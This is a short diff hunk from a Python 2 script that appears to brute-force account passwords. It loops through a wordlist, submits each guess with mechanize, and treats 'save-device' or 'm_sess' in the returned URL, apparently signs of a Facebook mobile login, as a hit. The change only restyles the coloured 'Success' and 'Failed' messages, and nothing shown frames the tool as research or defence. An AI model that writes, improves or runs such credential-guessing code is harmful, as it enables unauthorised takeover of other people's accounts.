@@ -76,7 +76,7 @@ for pasw in wordlist.readlines():
 		text=mech.geturl()
 		to += 1
 		if "save-device" in text or  "m_sess" in text:
-			print "%s Success => %s"%(G,pasw)
+			print "%s[√]Success => %s %s"%(G,W,pasw)
 			sys.exit()
 		else:
-			print "%s Failed => %s"%(R,pasw)
+			print "%s[!]Failed => %s %s"%(R,W,pasw)
